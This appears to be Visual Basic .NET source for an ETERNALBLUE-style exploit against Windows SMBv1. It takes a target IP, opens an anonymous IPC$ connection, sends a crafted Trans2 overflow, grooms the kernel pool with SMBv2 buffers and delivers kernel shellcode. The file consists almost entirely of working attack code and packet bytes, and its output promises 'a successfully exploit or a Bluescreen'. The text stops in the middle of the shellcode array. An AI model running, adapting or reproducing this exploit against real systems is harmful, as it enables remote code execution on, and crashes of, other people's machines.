Imports System.Net.Sockets
Imports System.Text

Module Module1

    Private Structure _SMB_HEADER
        Dim server_component() As Byte
        Dim smb_command() As Byte
        Dim error_class() As Byte
        Dim reserved1() As Byte
        Dim error_code() As Byte
        Dim flags() As Byte
        Dim flags2() As Byte
        Dim process_id_high() As Byte
        Dim signature() As Byte
        Dim reserved2() As Byte
        Dim tree_id() As Byte
        Dim process_id() As Byte
        Dim user_id() As Byte
        Dim multiplex_id() As Byte
    End Structure

    Sub Main()
        Const GROOM_DELTA As Integer = 5

        Dim targetAddr As String = ""
        Dim initial_grooms As Integer = 12
        Dim max_attempts As Integer = 3

        Dim args() As String = Environment.GetCommandLineArgs()
        If args.Length = 1 Then
            Console.Write("Target IP Address: ")
            Dim tmp As String = Console.ReadLine()
            If tmp <> "" Then
                targetAddr = tmp
            End If

            Console.Write("Initial Grooms: ")
            tmp = Console.ReadLine()
            If tmp <> "" Then
                If Int32.TryParse(tmp, initial_grooms) = False Then
                    initial_grooms = 12
                End If
            End If

            Console.Write("Max. attempts: ")
            tmp = Console.ReadLine()
            If tmp <> "" Then
                If Int32.TryParse(tmp, max_attempts) = False Then
                    max_attempts = 3
                End If
            End If
        Else
            Select Case args.Length
                Case 2
                    targetAddr = args(1)
                Case 3
                    targetAddr = args(1)
                    If Int32.TryParse(args(2), initial_grooms) = False Then
                        initial_grooms = 12
                    End If
                Case 4
                    targetAddr = args(1)
                    If Int32.TryParse(args(2), initial_grooms) = False Then
                        initial_grooms = 12
                    End If
                    If Int32.TryParse(args(3), max_attempts) = False Then
                        max_attempts = 3
                    End If
            End Select
        End If

        Console.Clear()

        For i As Integer = 1 To max_attempts
            Dim grooms As Integer = initial_grooms + GROOM_DELTA * (i - 1)
            smb_eternalblue(targetAddr, grooms)
            Console.WriteLine(New String("=", 75))
            Threading.Thread.Sleep(6000)
        Next

        Console.WriteLine("Exploitation finished. Expect a successfully exploit or a Bluescreen :)")
        Console.ReadKey()
    End Sub

    Private Sub smb_eternalblue(ByVal target As String, ByVal grooms As Integer)

        Dim shellcode() As Byte = make_kernel_user_payload(GetShellcode())
        Dim payload_hdr_pkt() As Byte = make_smb2_payload_body_packet()
        Dim payload_body_pkt() As Byte = make_smb2_payload_body_packet(shellcode)

        Console.WriteLine("Connecting to {0}....", target)

        'Step 1: Connect to IPC$ share
        Dim response() As Object = smb1_anonymous_connect_ipc(target)
        Dim smbheader As _SMB_HEADER = response(0)
        Dim sock As Socket = response(1)
        sock.ReceiveTimeout = 2000

        Console.WriteLine("Trying exploit with {0} Groom Allocations.", grooms)

        'Step 2: Create a large SMB1 buffer
        Console.WriteLine("Sending all but last fragment of exploit packet")
        smb1_large_buffer(smbheader, sock)

        'Step 3: Groom the pool with payload packets, and open/close SMB1 packets
        Console.WriteLine("Starting non-paged pool grooming")

        'initialize_groom_threads(ip, port, payload, grooms)
        Dim fhs_sock As Socket = smb1_free_hole(True, target)

        Console.WriteLine("Sending SMBv2 buffers")
        Dim groom_socks As List(Of Socket) = smb2_grooms(target, grooms, payload_hdr_pkt)

        Dim fhf_sock As Socket = smb1_free_hole(False, target)

        Console.WriteLine("Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer.")
        fhs_sock.Close()

        Console.WriteLine("Sending final SMBv2 buffers.")

        For Each s As Socket In smb2_grooms(target, 6, payload_hdr_pkt)
            groom_socks.Add(s)
        Next

        fhf_sock.Close()

        Console.WriteLine("Sending last fragment of exploit packet!")
        Dim final_exploit_pkt() As Byte = make_smb1_trans2_exploit_packet(smbheader.tree_id, smbheader.user_id, "eb_trans2_exploit", 15)

        Try
            sock.Send(final_exploit_pkt)
            response = smb1_get_response(sock)

            Console.WriteLine("Receiving response from exploit packet")

            Dim raw() As Byte = response(0)
            Dim exploit_smb_header As _SMB_HEADER = response(1)

            Dim smb_code As String = StrRvs(BitConverter.ToString(exploit_smb_header.error_code).Replace("-", ""))
            If smb_code = "0xC000000D" Then
                Console.WriteLine("ETERNALBLUE overwrite completed successfully ({0})!", smb_code)
            Else
                Console.WriteLine("ETERNALBLUE overwrite returned unexpected status code ({0})!", smb_code)
            End If
        Catch ex As Exception
            Console.WriteLine("Socket ERROR, Exploit will fail horrible!")
            Exit Sub
        End Try

        'Step 4: Send the payload
        Console.WriteLine("Sending egg to corrupted connection.")

        Dim first() As Byte = payload_body_pkt.Parse(0, 2919)
        Dim after() As Byte = payload_body_pkt.Parse(2920, 4072)

        For Each gsock As Socket In groom_socks
            gsock.Send(first)
        Next

        For Each gsock As Socket In groom_socks
            gsock.Send(after)
        Next

        Console.WriteLine("Triggering free of corrupted buffer.")
        For Each gsock As Socket In groom_socks
            gsock.Close()
        Next

        sock.Close()
    End Sub

    Private Function smb1_get_response(ByVal sock As Socket) As Object()
        Dim tcp_response() As Byte = New Byte(1023) {}
        Try
            For i As Integer = 0 To 15
                If tcp_response.Empty() = True Then
                    sock.Receive(tcp_response)
                Else
                    Exit For
                End If
            Next
        Catch ex As Exception
            Console.WriteLine("Socket Error in smb1_get_response()")
            Console.ReadKey()
            Process.GetCurrentProcess().Kill()
        End Try

        Dim netbios() As Byte = tcp_response.Parse(0, 4)
        Dim smb_header() As Byte = tcp_response.Parse(4, 36)
        Dim parsedheader As _SMB_HEADER = get_smb_header(smb_header)

        Return New Object() {tcp_response, parsedheader}
    End Function

    Private Function smb2_grooms(ByVal target As String, ByVal grooms As Integer, ByVal payload_hdr_pkt() As Byte) As List(Of Socket)
        Dim groom_socks As New List(Of Socket)

        For i As Integer = 0 To grooms - 1
            Dim client As New TcpClient(target, 445)
            Dim gsock As Socket = client.Client
            groom_socks.Add(gsock)
            gsock.Send(payload_hdr_pkt)
        Next

        Return groom_socks
    End Function

    Private Function smb1_free_hole(ByVal start As Boolean, ByVal target As String) As Socket
        Dim client As New TcpClient(target, 445)
        Dim sock As Socket = client.Client

        client_negotiate(sock)

        Dim pkt() As Byte
        If start = True Then
            pkt = make_smb1_free_hole_session_packet(New Byte() {&H7, &HC0}, New Byte() {&H2D, &H1}, New Byte() {&HF0, &HFF, &H0, &H0, &H0})
        Else
            pkt = make_smb1_free_hole_session_packet(New Byte() {&H7, &H40}, New Byte() {&H2C, &H1}, New Byte() {&HF8, &H87, &H0, &H0, &H0})
        End If

        sock.Send(pkt)
        smb1_get_response(sock)

        Return sock
    End Function

    Private Function make_smb1_free_hole_session_packet(ByVal flags2() As Byte, ByVal vcnum() As Byte, ByVal native_os() As Byte) As Byte()
        Dim pkt() As Byte = New Byte() {&H0}            'Session message

        pkt.Add(New Byte() {&H0, &H0, &H51})            'length
        pkt.Add(New Byte() {&HFF, &H53, &H4D, &H42})    'SMB1
        pkt.Add(New Byte() {&H73})                      'Session Setup AndX
        pkt.Add(New Byte() {&H0, &H0, &H0, &H0})        'NT SUCCESS
        pkt.Add(New Byte() {&H18})                      'Flags
        pkt.Add(flags2)                                 'Flags2
        pkt.Add(New Byte() {&H0, &H0})                  'PID High
        pkt.Add(New Byte() {&H0, &H0, &H0, &H0})        'Signature1
        pkt.Add(New Byte() {&H0, &H0, &H0, &H0})        'Signature2
        pkt.Add(New Byte() {&H0, &H0})                  'Reserved
        pkt.Add(New Byte() {&H0, &H0})                  'TreeID
        pkt.Add(New Byte() {&HFF, &HFE})                'PID
        pkt.Add(New Byte() {&H0, &H0})                  'UserID
        pkt.Add(New Byte() {&H40, &H0})                 'MultiplexID
        'pkt.add(New Byte() {&h00,&h00})                'Reserved

        pkt.Add(New Byte() {&HC})                       'Word Count
        pkt.Add(New Byte() {&HFF})                      'No further commands
        pkt.Add(New Byte() {&H0})                       'Reserved
        pkt.Add(New Byte() {&H0, &H0})                  'AndXOffset
        pkt.Add(New Byte() {&H4, &H11})                 'Max Buffer
        pkt.Add(New Byte() {&HA, &H0})                  'Max Mpx Count
        pkt.Add(vcnum)                                  'VC Number
        pkt.Add(New Byte() {&H0, &H0, &H0, &H0})        'Session key
        pkt.Add(New Byte() {&H0, &H0})                  'Security blob length
        pkt.Add(New Byte() {&H0, &H0, &H0, &H0})        'Reserved
        pkt.Add(New Byte() {&H0, &H0, &H0, &H80})       'Capabilities
        pkt.Add(New Byte() {&H16, &H0})                 'Byte count
        'pkt.add(New Byte() {&hf0})                     'Security Blob: <MISSING>
        'pkt.add(New Byte() {&hff,&h00,&h00,&h00})      'Native OS
        'pkt.add(New Byte() {&h00,&h00})                'Native LAN manager
        'pkt.add(New Byte() {&h00,&h00})                'Primary domain
        pkt.Add(native_os)

        pkt.Add(New Byte(17 - 1) {})

        Return pkt
    End Function

    Private Function smb1_large_buffer(ByVal smbheader As _SMB_HEADER, ByVal sock As Socket) As Object()
        Dim nt_trans_pkt() As Byte = make_smb1_nt_trans_packet(smbheader.tree_id, smbheader.user_id)
        sock.Send(nt_trans_pkt) 'send NT Trans

        Dim response() As Object = smb1_get_response(sock)
        Dim raw() As Byte = response(0)
        Dim transheader As _SMB_HEADER = response(1)

        'initial trans2 request
        Dim trans2_pkt_nulled() As Byte = make_smb1_trans2_exploit_packet(smbheader.tree_id, smbheader.user_id, "eb_trans2_zero", 0)
        For i As Integer = 1 To 14
            trans2_pkt_nulled.Add(make_smb1_trans2_exploit_packet(smbheader.tree_id, smbheader.user_id, "eb_trans2_buffer", i))
        Next

        trans2_pkt_nulled.Add(make_smb1_echo_packet(smbheader.tree_id, smbheader.user_id))
        sock.Send(trans2_pkt_nulled)

        Return smb1_get_response(sock)
    End Function

    Private Function make_smb1_echo_packet(ByVal tree_id() As Byte, ByVal user_id() As Byte) As Byte()
        Dim pkt() As Byte = New Byte() {&H0}

        pkt.Add(New Byte() {&H0, &H0, &H31})        'len = 49

        pkt.Add(New Byte() {&HFF})                  'SMB1
        pkt.Add(Encoding.ASCII.GetBytes("SMB"))

        pkt.Add(New Byte() {&H2B})                  'Echo
        pkt.Add(New Byte() {&H0, &H0, &H0, &H0})    'Success
        pkt.Add(New Byte() {&H18})                  'flags
        pkt.Add(New Byte() {&H7, &HC0})             'flags2
        pkt.Add(New Byte() {&H0, &H0})              'PID High
        pkt.Add(New Byte() {&H0, &H0, &H0, &H0})    'Signature1
        pkt.Add(New Byte() {&H0, &H0, &H0, &H0})    'Signature2
        pkt.Add(New Byte() {&H0, &H0})              'Reserved
        pkt.Add(tree_id)                            'Tree ID
        pkt.Add(New Byte() {&HFF, &HFE})            'PID
        pkt.Add(user_id)                            'UserID
        pkt.Add(New Byte() {&H40, &H0})             'MultiplexIDs

        pkt.Add(New Byte() {&H1})                   'Word count
        pkt.Add(New Byte() {&H1, &H0})              'Echo count
        pkt.Add(New Byte() {&HC, &H0})              'Byte count

        pkt.Add(New Byte() {&H41, &H41, &H41, &H41, &H41, &H41, &H41, &H41, &H41, &H41, &H41, &H0})

        Return pkt
    End Function

    Private Function make_smb1_trans2_exploit_packet(ByVal tree_id() As Byte, ByVal user_id() As Byte, ByVal type As String, ByVal timeout As Integer) As Byte()
        timeout = (timeout * &H10) + 3

        Dim pkt() As Byte = New Byte() {&H0}
        pkt.Add(New Byte() {&H0, &H10, &H35})                   'length
        pkt.Add(New Byte() {&HFF, &H53, &H4D, &H42})            'SMB1
        pkt.Add(New Byte() {&H33})                              'Trans2 request
        pkt.Add(New Byte() {&H0, &H0, &H0, &H0})                'NT SUCCESS
        pkt.Add(New Byte() {&H18})                              'Flags
        pkt.Add(New Byte() {&H7, &HC0})                         'Flags2
        pkt.Add(New Byte() {&H0, &H0})                          'PID High
        pkt.Add(New Byte() {&H0, &H0, &H0, &H0})                'Signature1
        pkt.Add(New Byte() {&H0, &H0, &H0, &H0})                'Signature2
        pkt.Add(New Byte() {&H0, &H0})                          'Reserved
        pkt.Add(tree_id)                                        'TreeID
        pkt.Add(New Byte() {&HFF, &HFE})                        'PID
        pkt.Add(user_id)                                        'UserID
        pkt.Add(New Byte() {&H40, &H0})                         'MultiplexIDs

        pkt.Add(New Byte() {&H9})                               'Word Count
        pkt.Add(New Byte() {&H0, &H0})                          'Total Param Count
        pkt.Add(New Byte() {&H0, &H10})                         'Total Data Count
        pkt.Add(New Byte() {&H0, &H0})                          'Max Param Count
        pkt.Add(New Byte() {&H0, &H0})                          'Max Data Count
        pkt.Add(New Byte() {&H0})                               'MaxSetup Count
        pkt.Add(New Byte() {&H0})                               'Reserved
        pkt.Add(New Byte() {&H0, &H10})                         'Flags
        pkt.Add(New Byte() {&H35, &H0, &HD0})                   'Timeouts
        pkt.Add(New Byte() {BitConverter.GetBytes(timeout)(0)}) 'timeout is a single int
        pkt.Add(New Byte() {&H0, &H0})                          'Reserved
        pkt.Add(New Byte() {&H0, &H10})                         'Parameter Count

        If type = "eb_trans2_exploit" Then
            pkt.Add(CreateByteArrWithValue(&H41, 2957))

            pkt.Add(New Byte() {&H80, &H0, &HA8, &H0})          'Overflow

            pkt.Add(New Byte(&H10 - &H1) {})
            pkt.Add(New Byte() {&HFF, &HFF})
            pkt.Add(New Byte(&H6 - &H1) {})
            pkt.Add(New Byte() {&HFF, &HFF})
            pkt.Add(New Byte(&H16 - &H1) {})

            pkt.Add(New Byte() {&H0, &HF1, &HDF, &HFF})         'x86 addresses
            pkt.Add(New Byte(&H8 - &H1) {})
            pkt.Add(New Byte() {&H20, &HF0, &HDF, &HFF})

            pkt.Add(New Byte() {&H0, &HF1, &HDF, &HFF, &HFF, &HFF, &HFF, &HFF}) 'x64

            pkt.Add(New Byte() {&H60, &H0, &H4, &H10})
            pkt.Add(New Byte(&H4 - &H1) {})

            pkt.Add(New Byte() {&H80, &HEF, &HDF, &HFF})

            pkt.Add(New Byte(&H4 - &H1) {})
            pkt.Add(New Byte() {&H10, &H0, &HD0, &HFF, &HFF, &HFF, &HFF, &HFF})
            pkt.Add(New Byte() {&H18, &H1, &HD0, &HFF, &HFF, &HFF, &HFF, &HFF})
            pkt.Add(New Byte(&H10 - &H1) {})

            pkt.Add(New Byte() {&H60, &H0, &H4, &H10})
            pkt.Add(New Byte(&HC - &H1) {})
            pkt.Add(New Byte() {&H90, &HFF, &HCF, &HFF, &HFF, &HFF, &HFF, &HFF})
            pkt.Add(New Byte(&H8 - &H1) {})
            pkt.Add(New Byte() {&H80, &H10})
            pkt.Add(New Byte(&HE - &H1) {})
            pkt.Add(New Byte() {&H39})
            pkt.Add(New Byte() {&HBB})

            pkt.Add(CreateByteArrWithValue(&H41, 965))

            Return pkt
        End If

        If type = "eb_trans2_zero" Then
            pkt.Add(CreateByteArrWithValue(&H0, 2055))
            pkt.Add(New Byte() {&H83, &HF3})
            pkt.Add(CreateByteArrWithValue(&H41, 2039))
        Else
            pkt.Add(CreateByteArrWithValue(&H41, 4096))
        End If

        Return pkt
    End Function

    Private Function make_smb1_nt_trans_packet(ByVal tree_id() As Byte, ByVal user_id() As Byte)
        Dim pkt() As Byte = New Byte() {&H0}

        pkt.Add(New Byte() {&H0, &H4, &H38})            'length
        pkt.Add(New Byte() {&HFF, &H53, &H4D, &H42})    'SMB1
        pkt.Add(New Byte() {&HA0})                      'NT Trans
        pkt.Add(New Byte() {&H0, &H0, &H0, &H0})        'NT SUCCESS
        pkt.Add(New Byte() {&H18})                      'lags
        pkt.Add(New Byte() {&H7, &HC0})                 'Flags2
        pkt.Add(New Byte() {&H0, &H0})                  'PID High
        pkt.Add(New Byte() {&H0, &H0, &H0, &H0})        'Signature1
        pkt.Add(New Byte() {&H0, &H0, &H0, &H0})        'Signature2
        pkt.Add(New Byte() {&H0, &H0})                  'Reserved
        pkt.Add(tree_id)                                'TreeID
        pkt.Add(New Byte() {&HFF, &HFE})                'PID
        pkt.Add(user_id)                                'UserID
        pkt.Add(New Byte() {&H40, &H0})                 'MultiplexID

        pkt.Add(New Byte() {&H14})                      'Word Count
        pkt.Add(New Byte() {&H1})                       'Max Setup Count
        pkt.Add(New Byte() {&H0, &H0})                  'Reserved
        pkt.Add(New Byte() {&H1E, &H0, &H0, &H0})       'Total Param Count
        pkt.Add(New Byte() {&HD0, &H3, &H1, &H0})       'Total Data Count
        pkt.Add(New Byte() {&H1E, &H0, &H0, &H0})       'Max Param Count
        pkt.Add(New Byte() {&H0, &H0, &H0, &H0})        'Max Data Count
        pkt.Add(New Byte() {&H1E, &H0, &H0, &H0})       'Param Count
        pkt.Add(New Byte() {&H4B, &H0, &H0, &H0})       'Param Offset
        pkt.Add(New Byte() {&HD0, &H3, &H0, &H0})       'Data Count
        pkt.Add(New Byte() {&H68, &H0, &H0, &H0})       'Data Offset
        pkt.Add(New Byte() {&H1})                       'Setup Count
        pkt.Add(New Byte() {&H0, &H0})                  'Function <unknown>
        pkt.Add(New Byte() {&H0, &H0})                  'Unknown NT transaction (0) setup
        pkt.Add(New Byte() {&HEC, &H3})                 'Byte Count

        pkt.Add(New Byte(&H1F - &H1) {})                'NT Parameters

        'undocumented
        pkt.Add(New Byte() {&H1})
        pkt.Add(New Byte(&H3CD - &H1) {})

        Return pkt
    End Function

    Private Function smb1_anonymous_connect_ipc(ByVal target As String) As Object()
        Dim client As New TcpClient(target, 445)

        Dim sock As Socket = client.Client
        client_negotiate(sock)

        Dim response() As Object = smb1_anonymous_login(sock)
        Dim raw() As Byte = response(0)

        Console.WriteLine("Connection established for exploitation.")

        printArray(raw.Parse(46, 146))

        Dim smbheader As _SMB_HEADER = response(1)

        Return New Object() {tree_connect_andx(sock, target, smbheader.user_id)(1), sock}
    End Function

    Private Function tree_connect_andx(ByVal sock As Socket, ByVal target As String, ByVal userid() As Byte) As Object()
        Dim raw_proto() As Byte = tree_connect_andx_request(target, userid)
        sock.Send(raw_proto)
        Return smb1_get_response(sock)
    End Function

    Private Function tree_connect_andx_request(ByVal target As String, ByVal userid() As Byte) As Byte()
        Dim pkt() As Byte = New Byte() {&H0}

        pkt.Add(New Byte() {&H0, &H0, &H47})                            'Length

        pkt.Add(New Byte() {&HFF, &H53, &H4D, &H42})                    'SMB
        pkt.Add(New Byte() {&H75})                                      'Tree Connect AndX
        pkt.Add(New Byte() {&H0, &H0, &H0, &H0})                        'nt_status
        pkt.Add(New Byte() {&H18})                                      'flags
        pkt.Add(New Byte() {&H1, &H20})                                 'flags2
        pkt.Add(New Byte() {&H0, &H0})                                  'process_id_high
        pkt.Add(New Byte() {&H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0})    'signature
        pkt.Add(New Byte() {&H0, &H0})                                  'reserved
        pkt.Add(New Byte() {&H0, &H0})                                  'tree_id
        pkt.Add(New Byte() {&H2F, &H4B})                                'process_id'
        pkt.Add(userid)
        pkt.Add(New Byte() {&HC5, &H5E})

        Dim ipc As String = "\\" + target + "\IPC$"

        pkt.Add(New Byte() {&H4})
        pkt.Add(New Byte() {&HFF})
        pkt.Add(New Byte() {&H0})
        pkt.Add(New Byte() {&H0, &H0})
        pkt.Add(New Byte() {&H0, &H0})
        pkt.Add(New Byte() {&H1, &H0})
        pkt.Add(New Byte() {&H1A, &H0})
        pkt.Add(New Byte() {&H0})
        pkt.Add(Encoding.ASCII.GetBytes(ipc))
        pkt.Add(New Byte() {&H0})

        pkt.Add(New Byte() {&H3F, &H3F, &H3F, &H3F, &H3F, &H0})

        Dim len As Integer = pkt.Length - 4

        Dim tmp() As Byte = BitConverter.GetBytes(len)
        Dim hexlen() As Byte = New Byte() {tmp(2), tmp(1), tmp(0)}

        pkt(1) = hexlen(0)
        pkt(2) = hexlen(1)
        pkt(3) = hexlen(2)

        Return pkt
    End Function

    Private Function client_negotiate(ByVal sock As Socket) As Object()
        Dim raw_proto() As Byte = negotiate_proto_request()
        sock.Send(raw_proto)
        Return smb1_get_response(sock)
    End Function

    Private Function smb1_anonymous_login(ByVal sock As Socket) As Object()
        Dim raw_proto() As Byte = make_smb1_anonymous_login_packet()
        sock.Send(raw_proto)
        Return smb1_get_response(sock)
    End Function

    Private Function get_smb_header(ByVal smbheader() As Byte) As _SMB_HEADER
        Dim _SMBHEADER As New _SMB_HEADER
        _SMBHEADER.server_component = smbheader.Parse(0, 3)
        _SMBHEADER.smb_command = New Byte() {smbheader(4)}
        _SMBHEADER.error_class = New Byte() {smbheader(5)}
        _SMBHEADER.reserved1 = New Byte() {smbheader(6)}
        _SMBHEADER.error_code = smbheader.Parse(5, 8)
        _SMBHEADER.flags = New Byte() {smbheader(8)}
        _SMBHEADER.flags2 = smbheader.Parse(9, 10)
        _SMBHEADER.process_id_high = smbheader.Parse(11, 12)
        _SMBHEADER.signature = smbheader.Parse(13, 21)
        _SMBHEADER.reserved2 = smbheader.Parse(22, 23)
        _SMBHEADER.tree_id = smbheader.Parse(24, 25)
        _SMBHEADER.process_id = smbheader.Parse(26, 27)
        _SMBHEADER.user_id = smbheader.Parse(28, 29)
        _SMBHEADER.multiplex_id = smbheader.Parse(30, 31)

        Return _SMBHEADER
    End Function

    Private Function make_smb1_anonymous_login_packet() As Byte()
        Dim pkt() As Byte = New Byte() {&H0}
        pkt.Add(New Byte() {&H0, &H0, &H88})            'length
        pkt.Add(New Byte() {&HFF, &H53, &H4D, &H42})    'SMB1
        pkt.Add(New Byte() {&H73})                      'Session Setup AndX
        pkt.Add(New Byte() {&H0, &H0, &H0, &H0})        'NTSUCCESS
        pkt.Add(New Byte() {&H18})                      'Flags
        pkt.Add(New Byte() {&H7, &HC0})                 'Flags2
        pkt.Add(New Byte() {&H0, &H0})                  'PID High
        pkt.Add(New Byte() {&H0, &H0, &H0, &H0})        'Signature1
        pkt.Add(New Byte() {&H0, &H0, &H0, &H0})        'Signature2
        pkt.Add(New Byte() {&H0, &H0})                  'TreeID
        pkt.Add(New Byte() {&HFF, &HFE})                'PID
        pkt.Add(New Byte() {&H0, &H0})                  'Reserved
        pkt.Add(New Byte() {&H0, &H0})                  'UserID
        pkt.Add(New Byte() {&H40, &H0})                 'MultiplexID

        pkt.Add(New Byte() {&HD})                       'Word Count
        pkt.Add(New Byte() {&HFF})                      'No further commands
        pkt.Add(New Byte() {&H0})                       'Reserved
        pkt.Add(New Byte() {&H88, &H0})                 'AndXOffset
        pkt.Add(New Byte() {&H4, &H11})                 'Max Buffer
        pkt.Add(New Byte() {&HA, &H0})                  'Max Mpx Count
        pkt.Add(New Byte() {&H0, &H0})                  'VC Number
        pkt.Add(New Byte() {&H0, &H0, &H0, &H0})        'Session key
        pkt.Add(New Byte() {&H1, &H0})                  'ANSI pw length
        pkt.Add(New Byte() {&H0, &H0})                  'Unicode pw length
        pkt.Add(New Byte() {&H0, &H0, &H0, &H0})        'Reserved
        pkt.Add(New Byte() {&HD4, &H0, &H0, &H0})       'Capabilities
        pkt.Add(New Byte() {&H4B, &H0})                 'Byte count
        pkt.Add(New Byte() {&H0})                       'ANSI pw
        pkt.Add(New Byte() {&H0, &H0})                  'Account name
        pkt.Add(New Byte() {&H0, &H0})                  'Domain name

        ' Windows 2000 2195
        pkt.Add(New Byte() {&H57, &H0, &H69, &H0, &H6E, &H0, &H64, &H0, &H6F, &H0, &H77, &H0, &H73, &H0, &H20, &H0, &H32})
        pkt.Add(New Byte() {&H0, &H30, &H0, &H30, &H0, &H30, &H0, &H20, &H0, &H32, &H0, &H31, &H0, &H39, &H0, &H35, &H0})
        pkt.Add(New Byte() {&H0, &H0})

        ' Windows 2000 5.0
        pkt.Add(New Byte() {&H57, &H0, &H69, &H0, &H6E, &H0, &H64, &H0, &H6F, &H0, &H77, &H0, &H73, &H0, &H20, &H0, &H32})
        pkt.Add(New Byte() {&H0, &H30, &H0, &H30, &H0, &H30, &H0, &H20, &H0, &H35, &H0, &H2E, &H0, &H30, &H0, &H0, &H0})

        Return pkt
    End Function

    Private Function negotiate_proto_request() As Byte()
        Dim pkt() As Byte = New Byte() {&H0}                            'Message_Type
        pkt.Add(New Byte() {&H0, &H0, &H54})                            'Length

        pkt.Add(New Byte() {&HFF, &H53, &H4D, &H42})                    'server_component: .SMB
        pkt.Add(New Byte() {&H72})                                      'smb_command: Negotiate Protocol
        pkt.Add(New Byte() {&H0, &H0, &H0, &H0})                        'nt_status
        pkt.Add(New Byte() {&H18})                                      'flags
        pkt.Add(New Byte() {&H1, &H28})                                 'flags2
        pkt.Add(New Byte() {&H0, &H0})                                  'process_id_high
        pkt.Add(New Byte() {&H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0})    'signature
        pkt.Add(New Byte() {&H0, &H0})                                  'reserved
        pkt.Add(New Byte() {&H0, &H0})                                  'tree_id
        pkt.Add(New Byte() {&H2F, &H4B})                                'process_id
        pkt.Add(New Byte() {&H0, &H0})                                  'user_id
        pkt.Add(New Byte() {&HC5, &H5E})                                'multiplex_id  

        pkt.Add(New Byte() {&H0})                                       'word_count
        pkt.Add(New Byte() {&H31, &H0})                                 'byte_count

        'Requested Dialects
        pkt.Add(New Byte() {&H2}) 'dialet_buffer_format
        pkt.Add(New Byte() {&H4C, &H41, &H4E, &H4D, &H41, &H4E, &H31, &H2E, &H30, &H0}) 'dialet_name: LANMAN1.0

        pkt.Add(New Byte() {&H2}) 'dialet_buffer_format
        pkt.Add(New Byte() {&H4C, &H4D, &H31, &H2E, &H32, &H58, &H30, &H30, &H32, &H0}) 'dialet_name: LM1.2X002

        pkt.Add(New Byte() {&H2}) 'dialet_buffer_format
        pkt.Add(New Byte() {&H4E, &H54, &H20, &H4C, &H41, &H4E, &H4D, &H41, &H4E, &H20, &H31, &H2E, &H30, &H0}) 'dialet_name3: NT LANMAN 1.0

        pkt.Add(New Byte() {&H2}) 'dialet_buffer_format
        pkt.Add(New Byte() {&H4E, &H54, &H20, &H4C, &H4D, &H20, &H30, &H2E, &H31, &H32, &H0}) 'dialet_name4: NT LM 0.12

        Return pkt
    End Function

    Private Function make_smb2_payload_body_packet(ByVal kernel_user_payload() As Byte) As Byte()
        Dim pkt_max_len As Integer = 4204
        Dim pkt_setup_len As Integer = 497
        Dim pkt_max_payload As Integer = pkt_max_len - pkt_setup_len

        Dim pkt() As Byte = New Byte(-1) {}

        'padding
        pkt.Add(New Byte(&H8 - &H1) {})
        pkt.Add(New Byte() {&H3, &H0, &H0, &H0})
        pkt.Add(New Byte(&H1C - &H1) {})
        pkt.Add(New Byte() {&H3, &H0, &H0, &H0})
        pkt.Add(New Byte(&H74 - &H1) {})

        'KI_USER_SHARED_DATA addresses
        pkt.Add(New Byte() {&HB0, &H0, &HD0, &HFF, &HFF, &HFF, &HFF, &HFF})
        pkt.Add(New Byte() {&HB0, &H0, &HD0, &HFF, &HFF, &HFF, &HFF, &HFF})

        pkt.Add(New Byte(&H10 - &H1) {})

        pkt.Add(New Byte() {&HC0, &HF0, &HDF, &HFF})
        pkt.Add(New Byte() {&HC0, &HF0, &HDF, &HFF})

        pkt.Add(New Byte(&HC4 - &H1) {})

        'payload addresses
        pkt.Add(New Byte() {&H90, &HF1, &HDF, &HFF})
        pkt.Add(New Byte(&H4 - &H1) {})
        pkt.Add(New Byte() {&HF0, &HF1, &HDF, &HFF})
        pkt.Add(New Byte(&H40 - &H1) {})

        pkt.Add(New Byte() {&HF0, &H1, &HD0, &HFF, &HFF, &HFF, &HFF, &HFF})
        pkt.Add(New Byte(&H8 - &H1) {})
        pkt.Add(New Byte() {&H0, &H2, &HD0, &HFF, &HFF, &HFF, &HFF, &HFF})
        pkt.Add(New Byte() {&H0})

        pkt.Add(kernel_user_payload)

        'fill out the rest, this can be randomly generated
        pkt.Add(New Byte((pkt_max_payload - kernel_user_payload.Length)) {})

        Return pkt
    End Function

    Private Function make_smb2_payload_body_packet() As Byte()
        Dim pkt() As Byte = New Byte() {&H0, &H0, &HFF, &HF7, &HFE}

        pkt.Add(Encoding.ASCII.GetBytes("SMB"))
        pkt.Add(New Byte(123) {})

        Return pkt
    End Function

    Private Function make_kernel_user_payload(ByVal ring3 As Byte()) As Byte()
        Dim sc() As Byte = New Byte(-1) {}

        sc.Add(make_kernel_shellcode)
        sc.Add(BitConverter.GetBytes(Convert.ToUInt16(ring3.Length)))
        sc.Add(ring3)

        Return sc
    End Function

    Private Function make_kernel_shellcode()
        Dim shellcode() As Byte = {&H31, &HC9, &H41, &HE2, &H1, &HC3, &HB9, &H82, &H0, &H0, &HC0, &HF, &H32, &H48, &HBB, &HF8,
                                    &HF, &HD0, &HFF, &HFF, &HFF, &HFF, &HFF, &H89, &H53, &H4, &H89, &H3, &H48, &H8D, &H5, &HA,
                                    &H0, &H0, &H0, &H48, &H89, &HC2, &H48, &HC1, &HEA, &H20, &HF, &H30, &HC3, &HF, &H1, &HF8,
                                    &H65, &H48, &H89, &H24, &H25, &H10, &H0, &H0, &H0, &H65, &H48, &H8B, &H24, &H25, &HA8, &H1,
                                    &H0, &H0, &H50, &H53, &H51, &H52, &H56, &H57, &H55, &H41, &H50, &H41, &H51, &H41, &H52, &H41,
                                    &H53, &H41, &H54, &H41, &H55, &H41, &H56, &H41, &H57, &H6A, &H2B, &H65, &HFF, &H34, &H25, &H10,
                                    &H0, &H0, &H0, &H41, &H53, &H6A, &H33, &H51, &H4C, &H89, &HD1, &H48, &H83, &HEC, &H8, &H55,
                                    &H48, &H81, &HEC, &H58, &H1, &H0, &H0, &H48, &H8D, &HAC, &H24, &H80, &H0, &H0, &H0, &H48,
                                    &H89, &H9D, &HC0, &H0, &H0, &H0, &H48, &H89, &HBD, &HC8, &H0, &H0, &H0, &H48, &H89, &HB5,
                                    &HD0, &H0, &H0, &H0, &H48, &HA1, &HF8, &HF, &HD0, &HFF, &HFF, &HFF, &HFF, &HFF, &H48, &H89,
                                    &HC2, &H48, &HC1, &HEA, &H20, &H48, &H31, &HDB, &HFF, &HCB, &H48, &H21, &HD8, &HB9, &H82, &H0,
                                    &H0, &HC0, &HF, &H30, &HFB, &HE8, &H38, &H0, &H0, &H0, &HFA, &H65, &H48, &H8B, &H24, &H25,
